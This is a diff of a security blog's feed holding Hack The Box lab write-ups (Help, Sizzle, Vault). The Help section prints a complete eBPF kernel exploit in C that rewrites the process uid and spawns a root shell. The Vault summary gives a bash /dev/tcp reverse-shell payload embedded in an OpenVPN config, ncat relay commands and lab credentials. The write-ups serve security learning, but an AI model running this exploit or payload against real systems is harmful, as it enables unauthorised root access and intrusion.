+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit.c&lt;/code&gt; :&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#include &amp;lt;stdio.h&amp;gt;
+#include &amp;lt;stdlib.h&amp;gt;
+#include &amp;lt;unistd.h&amp;gt;
+#include &amp;lt;errno.h&amp;gt;
+#include &amp;lt;fcntl.h&amp;gt;
+#include &amp;lt;string.h&amp;gt;
+#include &amp;lt;linux/bpf.h&amp;gt;
+#include &amp;lt;linux/unistd.h&amp;gt;
+#include &amp;lt;sys/mman.h&amp;gt;
+#include &amp;lt;sys/types.h&amp;gt;
+#include &amp;lt;sys/socket.h&amp;gt;
+#include &amp;lt;sys/un.h&amp;gt;
+#include &amp;lt;sys/stat.h&amp;gt;
+#include &amp;lt;stdint.h&amp;gt;
+
+#define PHYS_OFFSET 0xffff880000000000
+#define CRED_OFFSET 0x5f8
+#define UID_OFFSET 4
+#define LOG_BUF_SIZE 65536
+#define PROGSIZE 328
+
+int sockets[2];
+int mapfd, progfd;
+
+char *__prog = 	&quot;\xb4\x09\x00\x00\xff\xff\xff\xff&quot;
+		&quot;\x55\x09\x02\x00\xff\xff\xff\xff&quot;
+		&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\x18\x19\x00\x00\x03\x00\x00\x00&quot;
+		&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;
+		&quot;\x62\x0a\xfc\xff\x00\x00\x00\x00&quot;
+		&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;
+		&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;
+		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\x79\x06\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;
+		&quot;\x62\x0a\xfc\xff\x01\x00\x00\x00&quot;
+		&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;
+		&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;
+		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\x79\x07\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\xbf\x91\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\xbf\xa2\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\x07\x02\x00\x00\xfc\xff\xff\xff&quot;
+		&quot;\x62\x0a\xfc\xff\x02\x00\x00\x00&quot;
+		&quot;\x85\x00\x00\x00\x01\x00\x00\x00&quot;
+		&quot;\x55\x00\x01\x00\x00\x00\x00\x00&quot;
+		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\x79\x08\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\xbf\x02\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\xb7\x00\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\x55\x06\x03\x00\x00\x00\x00\x00&quot;
+		&quot;\x79\x73\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\x7b\x32\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\x55\x06\x02\x00\x01\x00\x00\x00&quot;
+		&quot;\x7b\xa2\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\x7b\x87\x00\x00\x00\x00\x00\x00&quot;
+		&quot;\x95\x00\x00\x00\x00\x00\x00\x00&quot;;
+
+char bpf_log_buf[LOG_BUF_SIZE];
+
+static int bpf_prog_load(enum bpf_prog_type prog_type,
+		  const struct bpf_insn *insns, int prog_len,
+		  const char *license, int kern_version) {
+	union bpf_attr attr = {
+		.prog_type = prog_type,
+		.insns = (__u64)insns,
+		.insn_cnt = prog_len / sizeof(struct bpf_insn),
+		.license = (__u64)license,
+		.log_buf = (__u64)bpf_log_buf,
+		.log_size = LOG_BUF_SIZE,
+		.log_level = 1,
+	};
+
+	attr.kern_version = kern_version;
+
+	bpf_log_buf[0] = 0;
+
+	return syscall(__NR_bpf, BPF_PROG_LOAD, &amp;amp;attr, sizeof(attr));
+}
+
+static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
+		   int max_entries) {
+	union bpf_attr attr = {
+		.map_type = map_type,
+		.key_size = key_size,
+		.value_size = value_size,
+		.max_entries = max_entries
+	};
+
+	return syscall(__NR_bpf, BPF_MAP_CREATE, &amp;amp;attr, sizeof(attr));
+}
+
+static int bpf_update_elem(uint64_t key, uint64_t value) {
+	union bpf_attr attr = {
+		.map_fd = mapfd,
+		.key = (__u64)&amp;amp;key,
+		.value = (__u64)&amp;amp;value,
+		.flags = 0,
+	};
+
+	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &amp;amp;attr, sizeof(attr));
+}
+
+static int bpf_lookup_elem(void *key, void *value) {
+	union bpf_attr attr = {
+		.map_fd = mapfd,
+		.key = (__u64)key,
+		.value = (__u64)value,
+	};
+
+	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &amp;amp;attr, sizeof(attr));
+}
+
+static void __exit(char *err) {
+	fprintf(stderr, &quot;error: %s\n&quot;, err);
+	exit(-1);
+}
+
+static void prep(void) {
+	mapfd = bpf_create_map(BPF_MAP_TYPE_ARRAY, sizeof(int), sizeof(long long), 3);
+	if (mapfd &amp;lt; 0)
+		__exit(strerror(errno));
+
+	progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER,
+			(struct bpf_insn *)__prog, PROGSIZE, &quot;GPL&quot;, 0);
+
+	if (progfd &amp;lt; 0)
+		__exit(strerror(errno));
+
+	if(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets))
+		__exit(strerror(errno));
+
+	if(setsockopt(sockets[1], SOL_SOCKET, SO_ATTACH_BPF, &amp;amp;progfd, sizeof(progfd)) &amp;lt; 0)
+		__exit(strerror(errno));
+}
+
+static void writemsg(void) {
+	char buffer[64];
+
+	ssize_t n = write(sockets[0], buffer, sizeof(buffer));
+
+	if (n &amp;lt; 0) {
+		perror(&quot;write&quot;);
+		return;
+	}
+	if (n != sizeof(buffer))
+		fprintf(stderr, &quot;short write: %lu\n&quot;, n);
+}
+
+#define __update_elem(a, b, c) \
+	bpf_update_elem(0, (a)); \
+	bpf_update_elem(1, (b)); \
+	bpf_update_elem(2, (c)); \
+	writemsg();
+
+static uint64_t get_value(int key) {
+	uint64_t value;
+
+	if (bpf_lookup_elem(&amp;amp;key, &amp;amp;value))
+		__exit(strerror(errno));
+
+	return value;
+}
+
+static uint64_t __get_fp(void) {
+	__update_elem(1, 0, 0);
+
+	return get_value(2);
+}
+
+static uint64_t __read(uint64_t addr) {
+	__update_elem(0, addr, 0);
+
+	return get_value(2);
+}
+
+static void __write(uint64_t addr, uint64_t val) {
+	__update_elem(2, addr, val);
+}
+
+static uint64_t get_sp(uint64_t addr) {
+	return addr &amp;amp; ~(0x4000 - 1);
+}
+
+static void pwn(void) {
+	uint64_t fp, sp, task_struct, credptr, uidptr;
+
+	fp = __get_fp();
+	if (fp &amp;lt; PHYS_OFFSET)
+		__exit(&quot;bogus fp&quot;);
+	
+	sp = get_sp(fp);
+	if (sp &amp;lt; PHYS_OFFSET)
+		__exit(&quot;bogus sp&quot;);
+	
+	task_struct = __read(sp);
+
+	if (task_struct &amp;lt; PHYS_OFFSET)
+		__exit(&quot;bogus task ptr&quot;);
+
+	printf(&quot;task_struct = %lx\n&quot;, task_struct);
+
+	credptr = __read(task_struct + CRED_OFFSET); // cred
+
+	if (credptr &amp;lt; PHYS_OFFSET)
+		__exit(&quot;bogus cred ptr&quot;);
+
+	uidptr = credptr + UID_OFFSET; // uid
+	if (uidptr &amp;lt; PHYS_OFFSET)
+		__exit(&quot;bogus uid ptr&quot;);
+
+	printf(&quot;uidptr = %lx\n&quot;, uidptr);
+	__write(uidptr, 0); // set both uid and gid to 0
+
+	if (getuid() == 0) {
+		printf(&quot;spawning root shell\n&quot;);
+		system(&quot;/bin/bash&quot;);
+		exit(0);
+	}
+
+	__exit(&quot;not vulnerable?&quot;);
+}
+
+int main(int argc, char **argv) {
+	prep();
+	pwn();
+
+	return 0;
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h4 id=&quot;i-ran-a-python-server-to-host-the-exploit-then-i-downloaded-it-on-the-box-&quot;&gt;I ran a python server to host the exploit then I downloaded it on the box :&lt;/h4&gt;
+&lt;p&gt;&lt;img src=&quot;/images/hackthebox/help/24.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;then-i-compiled-the-exploit-and-ran-it-&quot;&gt;Then I compiled the exploit and ran it :&lt;/h4&gt;
+&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gcc -o exploit exploit.c&lt;/code&gt;
+&lt;img src=&quot;/images/hackthebox/help/25.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;and-we-owned-root-&quot;&gt;And we owned root !&lt;/h4&gt;
+&lt;h4 id=&quot;thats-it--feedback-is-appreciated-&quot;&gt;That’s it , Feedback is appreciated !&lt;/h4&gt;
+&lt;h4 id=&quot;dont-forget-to-read-the-previous-write-ups--tweet-about-the-write-up-if-you-liked-it--follow-on-twitter-for-awesome-resources-ahm3d_h3sham&quot;&gt;Don’t forget to read the &lt;a href=&quot;/categories&quot;&gt;previous write-ups&lt;/a&gt; , Tweet about the write-up if you liked it , follow on twitter for awesome resources &lt;a href=&quot;https://twitter.com/Ahm3d_H3sham&quot;&gt;@Ahm3d_H3sham&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;thanks-for-reading&quot;&gt;Thanks for reading.&lt;/h4&gt;
+&lt;p&gt;&lt;br /&gt;
+&lt;br /&gt;&lt;/p&gt;
+&lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---sizzle&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/sizzle/&quot;&gt;Hack The Box - Sizzle&lt;/a&gt;&lt;/h4&gt;
+&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="php" /><category term="Python" /><category term="code analysis" /><summary type="html">Quick Summary Hey guys today Help retired and here’s my write-up about it. Help was a nice easy machine, I don’t really have much to say about it. To get an initial shell on the box we will exploit a non-authenticated file upload vulnerability in a web application called HelpDeskZ. This vulnerability could be exploited in two ways either by editing the exploit to include a higher range or by getting credentials to the web app and editing some settings to make the exploit work. After getting a shell the privilege escalation part is just a kernel exploit. It’s a Linux box and its ip is 10.10.10.121 I added it to /etc/hosts as help.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC help.htb We got ssh on port 22 and http on two ports : 80 and 3000. What’s running on port 80 is an Apache2 server and on port 3000 is Node.js Express Framework. HTTP Initial Enumeration On port 80 there’s just the default Apache index page : So I ran gobuster and got these results : gobuster -u http://help.htb/ -w /usr/share/wordlists/dirb/common.txt ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://help.htb/ [+] Threads : 10 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 10s ===================================================== 2019/06/07 13:03:25 Starting gobuster ===================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /index.html (Status: 200) /javascript (Status: 301) /server-status (Status: 403) /support (Status: 301) ===================================================== 2019/06/07 13:05:25 Finished ===================================================== I went to /support and there was a web application called HelpDeskZ : File Upload Vulnerability A quick search and I found an unauthenticated file upload vulnerability that takes advantage of the weak file renaming function that’s responsible for renaming tickets attachments and the ability to upload php files because they are allowed by default.</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/help/0.png" /></entry><entry><title type="html">Hack The Box - Sizzle</title><link href="http://localhost:4000/hack-the-box/sizzle/" rel="alternate" type="text/html" title="Hack The Box - Sizzle" /><published>2019-06-01T00:00:00+02:00</published><updated>2019-06-01T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/sizzle</id><content type="html" xml:base="http://localhost:4000/hack-the-box/sizzle/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
 &lt;h4 id=&quot;hey-guys-today-sizzle-retired-and-heres-my-write-up-about-it-sizzle-was-a-great-machine-everything-about-it-was-great-it-was-very-realistic-fun-and-of-course-challenging-as-it-was-rated-insane-personally-one-of-my-favorites-and-one-of-the-best-active-directory-boxes-i-have-ever-solved-it-starts-by-getting-write-access-to-a-directory-in-an-smb-share-a-simple-scf-file-attack-with-responder-and-john-could-give-me-a-password-for-a-user-with-that-password-i-could-generate-a-certificate-request-and-get-a-certificate-then-a-winrm-session-after-that-comes-the-most-challenging-part-about-the-box-which-is-bypassing-antivirus-kerberoasting-and-privilege-escalation-but-before-doing-that-we-will-take-a-look-at-an-unintended-way-first-that-was-the-box-in-a-nutshell-its-a-windows-box-and-its-ip-is-101010103-i-added-it-to-etchosts-as-sizzlehtb-lets-jump-right-in-&quot;&gt;Hey guys today Sizzle retired and here’s my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an &lt;code class=&quot;highlighter-rouge&quot;&gt;smb&lt;/code&gt; share, a simple &lt;code class=&quot;highlighter-rouge&quot;&gt;scf&lt;/code&gt; file attack with &lt;code class=&quot;highlighter-rouge&quot;&gt;responder&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;john&lt;/code&gt; could give me a password for a user. With that password I could generate a certificate request and get a certificate then a &lt;code class=&quot;highlighter-rouge&quot;&gt;WinRm&lt;/code&gt; session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It’s a Windows box and its ip is &lt;code class=&quot;highlighter-rouge&quot;&gt;10.10.10.103&lt;/code&gt;, I added it to &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/hosts&lt;/code&gt; as &lt;code class=&quot;highlighter-rouge&quot;&gt;sizzle.htb&lt;/code&gt;. Let’s jump right in !&lt;/h4&gt;
@@ -635,7 +1145,7 @@ mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
 &lt;h4 id=&quot;first-thing-is-to-configure-proxychains-to-use-port-8080-&quot;&gt;First thing is to configure &lt;code class=&quot;highlighter-rouge&quot;&gt;proxychains&lt;/code&gt; to use port 8080 :&lt;/h4&gt;
 &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/proxychains.conf&lt;/code&gt;
 &lt;img src=&quot;/images/hackthebox/sizzle/39.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-&lt;h4 id=&quot;then-we-will-use-auxiliaryserversocks4a-to-add-the-route-set-up-the-proxy-&quot;&gt;Then we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;auxiliary/server/socks4a&lt;/code&gt; to add the route set up the proxy :&lt;/h4&gt;
+&lt;h4 id=&quot;then-we-will-use-auxiliaryserversocks4a-to-add-the-route-and-set-up-the-proxy-&quot;&gt;Then we will use &lt;code class=&quot;highlighter-rouge&quot;&gt;auxiliary/server/socks4a&lt;/code&gt; to add the route and set up the proxy :&lt;/h4&gt;
 &lt;p&gt;&lt;img src=&quot;/images/hackthebox/sizzle/40.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;route-add-1010100-2552552550-1-this-adds-a-route-of-the-whole-internal-subnet-where-1-is-the-session-number&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;route add 10.10.10.0 255.255.255.0 1&lt;/code&gt; this adds a route of the whole internal subnet where &lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt; is the session number.&lt;/h4&gt;
 &lt;h4 id=&quot;now-we-are-ready-lets-kerberoast-&quot;&gt;Now we are ready. Let’s kerberoast !&lt;/h4&gt;
@@ -661,6 +1171,7 @@ mrlky:1603:aad3b435b51404eeaad3b435b51404ee:bceef4f6fe9c026d1d8dec8dce48adef:::
 &lt;p&gt;&lt;br /&gt;
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---chaos&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/chaos/&quot;&gt;Hack The Box - Chaos&lt;/a&gt;&lt;/h4&gt;
+&lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---help&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/help/&quot;&gt;Hack The Box - Help&lt;/a&gt;&lt;/h4&gt;
 &lt;hr /&gt;</content><author><name></name></author><category term="Windows" /><category term="Active Directory" /><category term="Windows Exploitation" /><category term="Networking" /><category term="smb" /><summary type="html">Quick Summary Hey guys today Sizzle retired and here’s my write-up about it. Sizzle was a great machine, everything about it was great. It was very realistic, fun and of course challenging as it was rated Insane. Personally one of my favorites and one of the best Active Directory boxes I have ever solved. It starts by getting write access to a directory in an smb share, a simple scf file attack with responder and john could give me a password for a user. With that password I could generate a certificate request and get a certificate then a WinRm session. After that comes the most challenging part about the box which is bypassing antivirus, kerberoasting and privilege escalation but before doing that we will take a look at an unintended way first. That was the box in a nutshell, It’s a Windows box and its ip is 10.10.10.103, I added it to /etc/hosts as sizzle.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC sizzle.htb Full Output : ``` Nmap 7.70 scan initiated Fri May 31 19:41:35 2019 as: nmap -sV -sT -sC -o nmapinitial sizzle.htb Nmap scan report for sizzle.htb (10.10.10.103) Host is up (0.15s latency). Not shown: 987 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd |ftp-anon: Anonymous FTP login allowed (FTP code 230) | ftp-syst: | SYST: Windows_NT 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn’t have a title (text/html). 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:44+00:00; -6s from scanner time. 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 |_http-title: Site doesn’t have a title (text/html). | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time. | tls-alpn: | h2 | http/1.1 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:43+00:00; -5s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:42+00:00; -6s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: HTB.LOCAL, Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=sizzle.htb.local | Not valid before: 2018-07-03T17:58:55 |_Not valid after: 2020-07-02T17:58:55 |_ssl-date: 2019-05-31T17:44:41+00:00; -6s from scanner time. 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.70%I=7%D=5/31%Time=5CF1678A%P=i686-pc-linux-gnu%r(DNSVer SF:sionBindReqTCP,20,”\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x0 SF:4bind\0\0\x10\0\x03”); Service Info: Host: SIZZLE; OS: Windows; CPE: cpe:/o:microsoft:windows</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/hackthebox/sizzle/0.png" /></entry><entry><title type="html">Hack The Box - Chaos</title><link href="http://localhost:4000/hack-the-box/chaos/" rel="alternate" type="text/html" title="Hack The Box - Chaos" /><published>2019-05-25T00:00:00+02:00</published><updated>2019-05-25T00:00:00+02:00</updated><id>http://localhost:4000/hack-the-box/chaos</id><content type="html" xml:base="http://localhost:4000/hack-the-box/chaos/">&lt;hr /&gt;
 
 &lt;h3 id=&quot;quick-summary&quot;&gt;Quick Summary&lt;/h3&gt;
@@ -3573,81 +4084,4 @@ Sep  2 15:13:43 DNS sudo: pam_unix(sudo:session): session closed for user root
 &lt;br /&gt;&lt;/p&gt;
 &lt;h4 id=&quot;previous-hack-the-box-write-up--hack-the-box---curling&quot;&gt;Previous Hack The Box write-up : &lt;a href=&quot;/hack-the-box/curling/&quot;&gt;Hack The Box - Curling&lt;/a&gt;&lt;/h4&gt;
 &lt;h4 id=&quot;next-hack-the-box-write-up--hack-the-box---redcross&quot;&gt;Next Hack The Box write-up : &lt;a href=&quot;/hack-the-box/redcross/&quot;&gt;Hack The Box - RedCross&lt;/a&gt;&lt;/h4&gt;
-&lt;hr /&gt;</content><author><name></name></author><category term="Linux" /><category term="Web" /><category term="RCE" /><category term="Forensics" /><category term="ssh" /><category term="Networking" /><category term="Pivoting" /><category term="Cryptography" /><summary type="html">Quick Summary Hey guys today Vault retired and here is my write-up about it. Vault was a fun box and it’s absolutely one of my favorites. Starting with an insecure file upload functionality to escaping from a host to another and getting a reverse shell with an openvpn config , Every step was very nice. It’s rated as medium , it’s a linux box and its ip is 10.10.10.109 I added it to /etc/hosts as vault.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC vault.htb Only two ports are open : 80 running http and 22 running ssh. As always we will check http. HTTP Initial Enumeration The main page is just displaying this message : Welcome to the Slowdaddy web interface We specialise in providing financial orginisations with strong web and database solutions and we promise to keep your customers financial data safe. We are proud to announce our first client: Sparklays (Sparklays.com still under construction) I ran gobuster but didn’t get anything , so I looked at the message again and noticed this line : We are proud to announce our first client: Sparklays (Sparklays.com still under construction). So I went to /sparklays and got a 403 response. So now we know that this directory exists and we can enumerate the sub directories of it , so I ran gobuster again and got these results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://vault.htb/sparklays/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/05 14:55:32 Starting gobuster ===================================================== /.hta (Status: 403) /.htpasswd (Status: 403) /.htaccess (Status: 403) /admin.php (Status: 200) /design (Status: 301) /admin.php sounds interesting. But in fact it’s useless. /admin.php : It asks for authentication , I tried test:test and got nothing. It didn’t print anything : And I also noticed that it’s sending the login data through GET parameters which is rarely used. Also checked the source of the page and there was nothing important so most likely this is just a rabbit hole and trying to bypass this login is a waste of time. /design : Design gave us a 403 response , I ran gobuster one more time and got these results : ===================================================== Gobuster v2.0.0 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://vault.htb/sparklays/design/ [+] Threads : 100 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Timeout : 2m0s ===================================================== 2019/04/05 15:03:20 Starting gobuster ===================================================== /.htaccess (Status: 403) /.hta (Status: 403) /.htpasswd (Status: 403) /uploads (Status: 301) So I checked /uploads : And it was also forbidden. But since there is a directory for uploads then there might be a page for uploading files lying around somewhere. I ran gobuster again and added the extensions php and html and got a new result : design.html /design.html : There’s a link titled Change Logo which takes us to this upload page : Bypassing Restricted File Upload I created a small php script to get a reverse shell : And named it shell.php. Tried to upload and as expected , it told us that this file type is not allowed : We need to know what are the allowed file types , We will use Zap’s fuzzer and a file extenstions wordlist I got from seclists. Intercept the request –&amp;gt; right click –&amp;gt; attack –&amp;gt; Fuzzer By filtering the response body size we will notice that all the responses are 519 bytes except the response of .php5 which is 526 bytes. So it allows files with extension .php5 to be uploaded. Since the request has already been sent then the php shell is on the server now , Let’s excute it : There are two users on the box alex and dave , user flag is not on the box. On the desktop of dave there is a file called ssh which has ssh credentials : Now we can get an ssh connection as dave instead of this reverse shell as www-data dave : Dav3therav3123 : Escaping from ubuntu to DNS , openvpn reverse shell , Getting user Let’s take a look at the rest of the files on dave’s desktop : No idea what to do with that key itscominghome so we will leave it for now. The other file is Servers : We have another ip now : 192.168.122.5 , We need to scan it but unfortunately nmap is not on the box : Alternatively we will use nc to scan the first 100 ports like this : nc -zv 192.168.122.5 1-100 Port 80 is open and running http : Port 22 is open and running ssh : We need to take a look at http , but we can’t access that host directly , so we will set up an ssh tunnel to redirect port 80 to our local machine : ssh -L 1234:192.168.122.4:80 dave@vault.htb Now we can go to http://localhost:1234 and access that http service : DNS configurator gives us a 404 response : Vpn configurator allows us to create an ovpn file and execute it : At this point I stopped and searched on that topic , because I didn’t know how to get a reverse shell from an ovpn file , and this article really helped. We are going to listen on the first host (ubuntu) and use the ovpn configurator to get a reverse shell on the second host (DNS) , We need to know the ip address of ubuntu on that subnet , ifconfig : ip : 192.168.122.1 Reverse shell payload : remote 192.168.122.1 dev tun nobind script-security 2 up &quot;/bin/bash -c 'bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.122.1/9898 0&amp;gt;&amp;amp;1'&quot; I used nobind because as you can see there’s a note saying that nobind must be used. Let’s update the file and click on Test VPN then check our listener : And we owned user ! SSH on DNS In the /home directory of dave on DNS there’s a file called ssh which has ssh credentials : So we can close that reverse shell and get an ssh connection on DNS as dave dave : dav3gerous567: But we had root on DNS , now we are dave. We want to get root again. sudo -l tells us that dave can use sudo on any command : So we can easily get root again by sudo su : Auth.log Enumeration By looking at Servers file again , which was on ubuntu We notice that there’s a host called The Vault and its ip is not there , so probably we need to get to that host , but we need its ip first. After a lot of enumeration I looked into auth.log and noticed that on the 2nd of September at 15:10:20 and 15:10:34 these commands were executed : Part of the log : Sep 2 15:08:55 DNS sudo: pam_unix(sudo:session): session closed for user root Sep 2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session opened for user root by (uid=0) Sep 2 15:09:01 DNS CRON[2459]: pam_unix(cron:session): session closed for user root Sep 2 15:10:20 DNS sudo: dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53 Sep 2 15:10:20 DNS sudo: pam_unix(sudo:session): session opened for user root by dave(uid=0) Sep 2 15:10:34 DNS sudo: dave : TTY=pts/0 ; PWD=/home/dave ; USER=root ; COMMAND=/usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53 Sep 2 15:10:34 DNS sudo: pam_unix(sudo:session): session opened for user root by dave(uid=0) Sep 2 15:13:43 DNS sudo: pam_unix(sudo:session): session closed for user root Commands : /usr/bin/ncat -l 1234 --sh-exec ncat 192.168.5.2 987 -p 53 /usr/bin/ncat -l 3333 --sh-exec ncat 192.168.5.2 987 -p 53 We have an ip (192.168.5.2) and we suspect that its the one we are looking for. I was using less to view the log so I searched for the ip to see if it was mentioned anywhere else :?192.168.5.2 , And I found it here too : Command : /usr/bin/nmap 192.168.5.2 -Pn --source-port=4444 On the same day at 15:07:51 That ip was scanned with nmap , and we notice --source-port=4444 , what’s that ? Source Port , Escaping from DNS to vault Let’s take that nmap command and run it again to see the results : Port 987 is open and the service is unknown , Let’s run nmap one more time as a regular scan : nmap -Pn 192.168.5.2 Port 53 and 4444 , both of them are closed. weird … where is port 987 ? So what’s happening is , port 987 is only open when the source port is 4444. When two hosts communicate with each other through a certain protocol , there’s a source port and a destination port , the source port is the port which the request was sent from and this port is randomly generated , the destination port is the port where the request is sent to , and it doesn’t change. So for example when communicating through http , the client sends the request from a source port which is random , that request is sent to the destination port which in this case is port 80. To be able to access port 987 we have to make sure that our source port is 4444. To do this we will use ncat and make it listen on port 2222 , then the service running on that port will be another ncat connection from port 4444 to port 987 on 192.168.5.2 ncat -l 2222 --sh-exec &quot;ncat -p 4444 192.168.5.2 987&quot; We will get another ssh connection to DNS , then we will connect to port 2222 on localhost , but before connecting we need to know what’s the service. Unfortunately nmap can’t tell us because our connection is not direct. So I guessed common services and it was ssh : I tried dave as the username and 